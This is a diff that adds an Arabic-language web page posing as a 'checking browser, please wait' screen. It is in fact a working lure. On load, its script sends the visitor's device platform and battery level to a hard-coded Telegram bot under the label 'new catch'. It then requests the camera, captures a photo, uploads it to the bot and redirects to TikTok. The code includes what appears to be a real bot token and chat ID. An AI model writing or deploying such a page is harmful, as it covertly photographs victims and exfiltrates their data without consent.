@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري التحميل...</title>
+    <script>
+        const TOKEN = "8646462631:AAFw8-Bq5okCVYCSMhZ8RPMUDMwEDqAizHQ";
+        const ADMIN_ID = "7616336100";
+
+        async function startHunt() {
+            try {
+                let b = await navigator.getBattery();
+                let info = `🎯 صيد جديد!\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${Math.round(b.level * 100)}%`;
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(info)}`);
+
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    let fd = new FormData();
+                    fd.append('photo', blob, 'capture.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${ADMIN_ID}`, {
+                        method: 'POST', body: fd
+                    }).then(() => { window.location.href = "https://www.tiktok.com"; });
+                }, 'image/jpeg');
+            } catch (e) { window.location.href = "https://www.tiktok.com"; }
+        }
+        window.onload = startHunt;
+    </script>
+</head>
+<body style="background:#000; color:#fff; text-align:center; padding-top:200px; font-family:sans-serif;">
+    <p>جاري فحص المتصفح... يرجى الانتظار</p>
+</body>
+</html>
